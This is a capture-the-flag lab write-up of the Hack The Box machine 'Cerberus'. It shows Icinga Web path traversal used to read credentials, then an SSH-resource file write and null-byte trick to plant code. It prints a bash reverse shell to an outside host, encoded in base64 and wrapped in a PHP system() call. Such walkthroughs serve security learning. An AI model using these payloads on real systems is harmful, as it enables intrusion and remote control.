---
description: https://app.hackthebox.com/machines/534
---

# 🐶 Cerberus

<figure><img src="../../../../.gitbook/assets/image (947).png" alt=""><figcaption></figcaption></figure>

We start by scanning our application and looking at the output we can imagine a web server with some sort of pivoting into an internal server:

<figure><img src="../../../../.gitbook/assets/image (948).png" alt=""><figcaption></figcaption></figure>

So we can see this landing page after putting everything we need into the /etc/hosts file:

<figure><img src="../../../../.gitbook/assets/image (949).png" alt=""><figcaption></figcaption></figure>

after looking up the known exploits:

{% embed url="https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/" %}

This hits my eye:

<figure><img src="../../../../.gitbook/assets/image (951).png" alt=""><figcaption></figcaption></figure>

I'll fire up burp and try to look for this file ->

and after a bit of troubleshooting, we find this entry point:

<figure><img src="../../../../.gitbook/assets/image (952).png" alt=""><figcaption></figcaption></figure>

So we got a nice file read vuln right here and we can see the DC.cerberus.local domain that looks like an internal network

so we can pretty much go and look at what would be some web config pages with inciga that we would want to read ->

{% embed url="https://icinga.com/docs/icinga-web/latest/doc/03-Configuration/" %}

<figure><img src="../../../../.gitbook/assets/image (953).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (954).png" alt=""><figcaption></figcaption></figure>

So we look around those files and find something fun:

<figure><img src="../../../../.gitbook/assets/image (956).png" alt=""><figcaption></figcaption></figure>

So we can find matthew in the Admin group and his creds and we can access the dashboard thanks to those:

&#x20;

<figure><img src="../../../../.gitbook/assets/image (957).png" alt=""><figcaption></figcaption></figure>

So we see some stuff about modules, let's keep that in mind. In the first website we could see an auth user CVE:

<figure><img src="../../../../.gitbook/assets/image (959).png" alt=""><figcaption></figcaption></figure>

So we see something about ssh ressource, can we find this on the website:

<figure><img src="../../../../.gitbook/assets/image (960).png" alt=""><figcaption></figcaption></figure>

I see a private key input, so i gen my key:

```
openssl genrsa -out mykey.pem 1024
```

<figure><img src="../../../../.gitbook/assets/image (962).png" alt=""><figcaption></figcaption></figure>

then i'll upload everything using my own key:

<figure><img src="../../../../.gitbook/assets/image (961).png" alt=""><figcaption></figcaption></figure>

I just modified the user since the article talked about saving the resource outside the intended directory and was able to access my key using this technique:

<figure><img src="../../../../.gitbook/assets/image (963).png" alt=""><figcaption></figcaption></figure>

Since \<e have access to the files, maybe we can trigger a PHP revers shell:

```
echo -n '/bin/bash -i >& /dev/tcp/10.10.14.141:3636 0>&1' | base64 -w 0
```

<figure><img src="../../../../.gitbook/assets/image (976).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (979).png" alt=""><figcaption></figcaption></figure>

```
<?php system("echo -n L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0MTozNjM2IDA+JjE | base64 -d | bash")?>
```

We can see how the CVE is trhiggered:

[https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/)

<figure><img src="../../../../.gitbook/assets/image (980).png" alt=""><figcaption></figcaption></figure>

So for the payload to be triggered, we need to put a null byte in between the cert and the payload

So we put a null byte in between and forward the request:

<figure><img src="../../../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

And we can see here how we trigger the code, we have to change the default path of the modules to the place we put our payload:

<figure><img src="../../../../.gitbook/assets/image (982).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (983).png" alt=""><figcaption></figcaption></figure>

We change this to /dev/shm

